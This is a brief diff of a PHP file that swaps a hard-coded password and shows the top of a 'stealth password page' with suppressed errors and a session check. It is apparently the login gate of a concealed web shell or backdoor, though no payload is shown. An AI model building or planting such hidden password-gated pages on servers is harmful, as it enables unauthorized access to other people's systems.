@@ -2,7 +2,7 @@
 error_reporting(0);
 session_start();
 
-$password = "12345";   // ← Apna password yahan change kar do
+$password = "wiredmouseis";   
 
 // ====================== STEALTH PASSWORD PAGE ======================
 if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
